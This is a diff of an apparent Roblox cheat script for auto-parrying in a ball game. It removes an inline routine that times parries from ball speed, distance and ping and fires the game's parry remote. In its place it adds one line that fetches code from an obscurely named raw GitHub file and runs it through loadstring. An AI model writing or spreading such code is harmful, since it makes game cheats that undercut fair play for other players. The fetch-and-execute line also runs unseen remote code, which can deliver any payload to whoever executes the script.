@@ -197,61 +197,7 @@ end
 local Toggle = Tabs.P:AddToggle("AutoParry", {Title = "Auto Parry", Default = false })
 
 Toggle:OnChanged(function()
-  getgenv().Paws = {
-    ["AutoParry"] = true,
-    ["PingBased"] = false,
-    ["PingBasedOffset"] = 5,
-    ["DistanceToParry"] = 0.6,
-    ["BallSpeedCheck"] = false,
-  }
-  
-  local Players = game:GetService("Players")
-  local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-  local ReplicatedPaw = game:GetService("ReplicatedStorage")
-  
-  local Paws = ReplicatedPaw:WaitForChild("Remotes", 9e9)
-  local PawsBalls = workspace:WaitForChild("Balls", 9e9)
-  local PawsTable = getgenv().Paws
-  
-  local function IsTheTarget()
-    return Player.Character:FindFirstChild("Highlight")
-  end
-  
-  local function FindBall()
-  local RealBall
-  for i, v in pairs(PawsBalls:GetChildren()) do
-    if v:GetAttribute("realBall") == true then
-        RealBall = v
-    end
-  end
-  return RealBall
-  end
-  
-  game:GetService("RunService").PreRender:connect(function()
-    if not FindBall() then 
-            return
-    end
-    local Ball = FindBall()
-    
-    local BallPosition = Ball.Position
-    
-    local BallVelocity = Ball.AssemblyLinearVelocity.Magnitude
-    
-    local Distance = Player:DistanceFromCharacter(BallPosition)
-    
-    local Ping = BallVelocity * (game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000)
-    
-    if PawsTable.PingBased then
-    Distance -= Ping + PawsTable.PingBasedOffset
-    end
-    
-    if PawsTable.BallSpeedCheck and BallVelocity == 0 then return
-    end
-    
-    if (Distance / BallVelocity) <= PawsTable.DistanceToParry and IsTheTarget() and PawsTable.AutoParry then
-           Paws:WaitForChild("ParryButtonPress"):Fire()
-       end
-  end) 
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/kehxyzdev/xhsjxnxnsjjsnz/main/xhzhusbxsbjsjs"))()
 end)
 Tabs.P:AddButton({
   Title = "Auto Spam Parry [In Dev]",
